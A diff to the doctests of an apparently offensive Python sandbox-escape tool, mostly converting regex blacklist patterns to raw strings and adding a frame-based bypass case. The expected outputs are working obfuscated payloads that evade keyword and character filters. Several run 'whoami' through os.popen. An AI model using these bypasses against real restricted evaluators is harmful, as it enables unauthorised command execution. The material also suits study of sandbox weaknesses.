@@ -76,7 +76,7 @@ def test_Int():
     >>> _test("by_cal", "2024", ["0", "1", "3", "4", "5", "6", "7", "8"], "[0|1|3-8]")
     -2+2**2*9**2*(2+2**2)+9**2+True
 
-    >>> _test("by_ord", "2024", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"], "\\d")
+    >>> _test("by_ord", "2024", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"], r"\\d")
     ord('ߨ')
 
     >>> _test("by_unicode", "2024", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"], "[0-9]")
@@ -85,7 +85,7 @@ def test_Int():
     >>> _test("by_hex", "-2024", ["2", "4"], "2|4")
     -0x7e8
 
-    >>> _test("by_ord", "-2024", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"], "\\d")
+    >>> _test("by_ord", "-2024", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"], r"\\d")
     -ord('ߨ')
 
     >>> _test("by_cal", "-2024", ["2", "4"], "2|4")
@@ -128,7 +128,7 @@ def test_String():
     >>> _test("by_char_add", "'macr0phag3'", ["mac", ], "mac")
     ('m'+'a'+'c'+'r'+'0'+'p'+'h'+'a'+'g'+'3')
 
-    >>> _test("by_char_add", "'macr0phag3'", ["mac", "+"], "mac|\\+")
+    >>> _test("by_char_add", "'macr0phag3'", ["mac", "+"], r"mac|\\+")
     ''.join(('m','a','c','r','0','p','h','a','g','3'))
 
     >>> _test("by_hex_encode", "'macr0phag3'", ["mac", ], "mac")
@@ -206,19 +206,19 @@ def test_Attribute():
     >>> _test = functools.partial(_test, "Bypass_Attribute")
     >>> # ---------------------------------------------------
 
-    >>> _test("by_getattr", "os.system", [".", ], "\\.")
+    >>> _test("by_getattr", "os.system", [".", ], r"\\.")
     getattr(os,'system')
 
-    >>> _test("by_vars", "os.system", [".", ], "\\.")
+    >>> _test("by_vars", "os.system", [".", ], r"\\.")
     vars(os)['system']
 
-    >>> _test("by_vars", "(1+1).system", [".", ], "\\.")
+    >>> _test("by_vars", "(1+1).system", [".", ], r"\\.")
     (1+1).system
 
-    >>> _test("by_dict_attr", "os.system", [".system", ], "\\.system")
+    >>> _test("by_dict_attr", "os.system", [".system", ], r"\\.system")
     os.__dict__['system']
 
-    >>> _test("by_dict_attr", "(1+1).system", [".", ], "\\.")
+    >>> _test("by_dict_attr", "(1+1).system", [".", ], r"\\.")
     (1+1).system
     """
 
@@ -257,34 +257,34 @@ def test_Combo():
     >>> # ---------------------------------------------------
 
     >>> # ----- Int -----
-    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "1", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "True", "all"], "\\d|all|True", maps=maps)
+    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "1", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "True", "all"], r"\\d|all|True", maps=maps)
     len(str(()))**False
 
     >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "12", ["1", "2", "True"], "1|2|True", maps=maps)
     4**len(str(()))+0**0-5
 
-    >>> maps = {"Bypass_Int": ["by_trans"]}; _test(..., "1", ["1", "True", "all", "(", "*", "+"], "1|True|all|\\(|\\*|\\+", maps=maps)
+    >>> maps = {"Bypass_Int": ["by_trans"]}; _test(..., "1", ["1", "True", "all", "(", "*", "+"], r"1|True|all|\\(|\\*|\\+", maps=maps)
     -~False
 
     >>> maps = {"Bypass_Int": ["by_trans"]}; _test(..., "2", ["2", "True"], "2|True", maps=maps)
     len(str(()))
 
-    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "1", ["0", "1", "3", "4", "5", "6", "7", "8", "True", "False", "*", "+"], "[0|1|3-8]|True|False|\\*|\\+", maps=maps)
+    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "1", ["0", "1", "3", "4", "5", "6", "7", "8", "True", "False", "*", "+"], r"[0|1|3-8]|True|False|\\*|\\+", maps=maps)
     all(())
 
-    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "-1", ["0", "1", "3", "4", "5", "6", "7", "8", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "True", "False", "*"], "[0|1|3-8|a-z|True|False|\\*]", maps=maps)
+    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "-1", ["0", "1", "3", "4", "5", "6", "7", "8", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "True", "False", "*"], r"[0|1|3-8|a-z|True|False|\\*]", maps=maps)
     9-2-(2+9+9-2-(9+2-(9-2-(2+2+2))))
 
-    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "-1", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "*", "+"], "[0-9|\\*|\\+]", maps=maps)
+    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "-1", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "*", "+"], r"[0-9|\\*|\\+]", maps=maps)
     True-len(str(()))
 
-    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "1000", ["0", "1", "2", "3", "4", "5", "6", "7", "9", "-", "*", "True", "False"], "[0-6|7|9|\\-|\\*]|True|False", maps=maps)
+    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "1000", ["0", "1", "2", "3", "4", "5", "6", "7", "9", "-", "*", "True", "False"], r"[0-6|7|9|\\-|\\*]|True|False", maps=maps)
     8+8+8+8+8+8+8+8+8+8+8+8+8+8+888
 
-    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "2024", ["0", "1", "3", "4", "5", "6", "7", "8", "True", "False", "*"], "[0|1|3-8]|True|False|\\*", maps=maps)
+    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "2024", ["0", "1", "3", "4", "5", "6", "7", "8", "True", "False", "*"], r"[0|1|3-8]|True|False|\\*", maps=maps)
     9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+2+9+9-2-(9+2-(2+9-all(())-9))
 
-    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "2024", ["1", "2", "4", "*"], "1|2|4|\\*", maps=maps)
+    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "2024", ["1", "2", "4", "*"], r"1|2|4|\\*", maps=maps)
     9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+998
 
     >>> # ----- String -----
@@ -316,23 +316,26 @@ def test_Combo():
     ma𝒙(dict(_＿import_＿=()))
 
     >>> # ----- Attribute -----
-    >>> maps = {"Bypass_Attribute": ["by_getattr"], "Bypass_String": ["by_dict"], "Bypass_Keyword": ["by_unicode"]}; _test(..., "os.system", [".", "sys", '"', "'"], "\\.|sys|'|\\"", maps=maps)
+    >>> maps = {"Bypass_Attribute": ["by_getattr"], "Bypass_String": ["by_dict"], "Bypass_Keyword": ["by_unicode"]}; _test(..., "os.system", [".", "sys", '"', "'"], r"\\.|sys|'|\\\"", maps=maps)
     getattr(os,max(dict(𝒔ystem=())))
 
-    >>> maps = {"Bypass_Attribute": ["by_vars"], "Bypass_String": ["by_dict"], "Bypass_Keyword": ["by_unicode"]}; _test(..., "os.system", [".", "sys", '"', "'"], "\\.|sys|'|\\"", maps=maps)
+    >>> maps = {"Bypass_Attribute": ["by_vars"], "Bypass_String": ["by_dict"], "Bypass_Keyword": ["by_unicode"]}; _test(..., "os.system", [".", "sys", '"', "'"], r"\\.|sys|'|\\\"", maps=maps)
     vars(os)[max(dict(𝒔ystem=()))]
 
     >>> # ----- Name -----
-    >>> maps = {"Bypass_Name": ["by_builtins"], "Bypass_String": ["by_char_add", "by_char"], "Bypass_Attribute": ["by_getattr"]}; _test(..., "__import__", [".", "import", '"', "'"], "\\.|import|'|\\"", maps=maps)
+    >>> maps = {"Bypass_Name": ["by_builtins"], "Bypass_String": ["by_char_add", "by_char"], "Bypass_Attribute": ["by_getattr"]}; _test(..., "__import__", [".", "import", '"', "'"], r"\\.|import|'|\\\"", maps=maps)
     getattr(__builtins__,(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)))
 
     >>> # ----- Integrated -----
-    >>> maps = {"Bypass_Name": ["by_builtins"], "Bypass_String": ["by_char_add", "by_char"], "Bypass_Attribute": ["by_getattr"]}; _test(..., "__import__('os').popen('whoami').read()", [".", "import", '"', "'"], "\\.|import|'|\\"", maps=maps)
+    >>> maps = {"Bypass_Name": ["by_builtins"], "Bypass_String": ["by_char_add", "by_char"], "Bypass_Attribute": ["by_getattr"]}; _test(..., "__import__('os').popen('whoami').read()", [".", "import", '"', "'"], r"\\.|import|'|\\\"", maps=maps)
     getattr(getattr(getattr(__builtins__,chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))(chr(111)+chr(115)),chr(112)+chr(111)+chr(112)+chr(101)+chr(110))(chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)),(chr(114)+chr(101)+chr(97)+chr(100)))()
 
-    >>> maps = {"Bypass_Name": ["by_unicode"], "Bypass_String": ["by_char", "by_char_add", "by_char_format"], "Bypass_Attribute": ["by_getattr"]}; _test(..., "__import__('os').popen('whoami').read()", ["__", ".", "'", '"', "read", "chr"], "__|\\.|'|\\"|read|chr", maps=maps)
+    >>> maps = {"Bypass_Name": ["by_frame"], "Bypass_String": ["by_char_add"]}; _test(..., '__import__("os")', [], "__|＿", maps=maps)
+    (i for i in ()).gi_frame.f_builtins[('_'+'_'+'i'+'m'+'p'+'o'+'r'+'t'+'_'+'_')]('os')
+
+    >>> maps = {"Bypass_Name": ["by_unicode"], "Bypass_String": ["by_char", "by_char_add", "by_char_format"], "Bypass_Attribute": ["by_getattr"]}; _test(..., "__import__('os').popen('whoami').read()", ["__", ".", "'", '"', "read", "chr"], r"__|\\.|'|\\\"|read|chr", maps=maps)
     getattr(getattr(_＿import_＿((𝒄hr(37)+𝒄hr(99))%111+(𝒄hr(37)+𝒄hr(99))%115),(𝒄hr(37)+𝒄hr(99))%112+(𝒄hr(37)+𝒄hr(99))%111+(𝒄hr(37)+𝒄hr(99))%112+(𝒄hr(37)+𝒄hr(99))%101+(𝒄hr(37)+𝒄hr(99))%110)((𝒄hr(37)+𝒄hr(99))%119+(𝒄hr(37)+𝒄hr(99))%104+(𝒄hr(37)+𝒄hr(99))%111+(𝒄hr(37)+𝒄hr(99))%97+(𝒄hr(37)+𝒄hr(99))%109+(𝒄hr(37)+𝒄hr(99))%105),((𝒄hr(37)+𝒄hr(99))%114+(𝒄hr(37)+𝒄hr(99))%101+(𝒄hr(37)+𝒄hr(99))%97+(𝒄hr(37)+𝒄hr(99))%100))()
 
-    >>> maps = {"Bypass_Name": ["by_unicode"], "Bypass_String": ["by_char", "by_char_add", "by_char_format"], "Bypass_Attribute": ["by_getattr"], "Bypass_Int": ["by_cal"],}; _test(..., "__import__('os').popen('whoami').read()", ["__", ".", "'", '"', "read", "chr", "0", "1"], "__|\\.|'|\\"|read|chr|0|1", maps=maps)
+    >>> maps = {"Bypass_Name": ["by_unicode"], "Bypass_String": ["by_char", "by_char_add", "by_char_format"], "Bypass_Attribute": ["by_getattr"], "Bypass_Int": ["by_cal"],}; _test(..., "__import__('os').popen('whoami').read()", ["__", ".", "'", '"', "read", "chr", "0", "1"], r"__|\\.|'|\\\"|read|chr|0|1", maps=maps)
     getattr(getattr(_＿import_＿((𝒄hr(37)+𝒄hr(99))%(-5**2+7+7**2+9**2-True)+(𝒄hr(37)+𝒄hr(99))%(34+9**2)),(𝒄hr(37)+𝒄hr(99))%(-5**2+7**2+8+9**2-True)+(𝒄hr(37)+𝒄hr(99))%(-5**2+7+7**2+9**2-True)+(𝒄hr(37)+𝒄hr(99))%(-5**2+7**2+8+9**2-True)+(𝒄hr(37)+𝒄hr(99))%(5**2-6+9**2+True)+(𝒄hr(37)+𝒄hr(99))%(29+9**2))((𝒄hr(37)+𝒄hr(99))%(38+9**2)+(𝒄hr(37)+𝒄hr(99))%(23+9**2)+(𝒄hr(37)+𝒄hr(99))%(-5**2+7+7**2+9**2-True)+(𝒄hr(37)+𝒄hr(99))%97+(𝒄hr(37)+𝒄hr(99))%(28+9**2)+(𝒄hr(37)+𝒄hr(99))%(24+9**2)),((𝒄hr(37)+𝒄hr(99))%(33+9**2)+(𝒄hr(37)+𝒄hr(99))%(5**2-6+9**2+True)+(𝒄hr(37)+𝒄hr(99))%97+(𝒄hr(37)+𝒄hr(99))%(5**2-7+9**2+True)))()
     """
